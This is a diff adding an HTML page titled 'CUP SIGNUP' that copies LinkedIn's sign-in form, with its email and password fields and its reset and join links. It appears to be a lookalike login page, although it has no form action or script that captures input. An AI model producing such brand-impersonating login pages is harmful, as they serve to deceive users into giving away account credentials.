@@ -1,0 +1,49 @@
+<html>
+<head>
+<title>
+CUP SIGNUP
+</title>
+<link rel="stylesheet" href="style.css">
+<link rel="icon" href="img/cup_logo_ico.ico" type="image/x-icon">
+</head>
+<body>
+<div class = "center">
+</div>
+<fieldset class="field-container field-container--fixed">
+<legend>Sign in to LinkedIn</legend>
+<div class="outer-wrapper">
+<div class="inner-wrapper">
+<div class="logo_container">LinkedIn</div>
+<ul class="form-fields" id="mini-profile--js">
+<li class="form-email ">
+<div class="fieldgroup hide-label">
+<label for="session_key-login">Email address or phone number</label>
+<span class="error" id="session_key-login-error"></span>
+<input type="text" name="session_key" value="" id="session_key-login" placeholder="Email address or phone number" aria-describedby="session_key-login-error">
+<div class="domain-suggestion hide" id="domainSuggestion">
+<span>Did you mean: <a id="suggestion" href="javascript:void(0);"></a>?</span>
+</div>
+</div>
+</li>
+<li class="form-password">
+<div class="fieldgroup hide-label">
+<label for="session_password-login">Password</label>
+<span class="error" id="session_password-login-error"></span>
+<div class="password_wrapper">
+<input type="password" id="session_password-login" class="password" name="session_password" placeholder="Password" aria-describedby="session_password-login-error"/>
+<a data-li-tooltip-id="login-tooltip" href="/uas/request-password-reset?session_redirect=&amp;trk=signin_fpwd" tracking="signin_fpwd" class="nav-link forgot-password-link password-reminder-link" title="Forgot password?">?</a>
+</div>
+</div>
+</li>
+<li class="button form-actions">
+<div class="form-buttons">
+<input type="submit" name="signin" value="Sign In" class="btn-primary" id="btn-primary">
+</div>
+<span>Not a member? <a href="/start/join?trk=uas-consumer-login-internal-join-lnk">Join now</a></span>
+</li>
+</ul>
+</div>
+<div class="gaussian-blur"></div>
+</div>
+</body>
+</html>
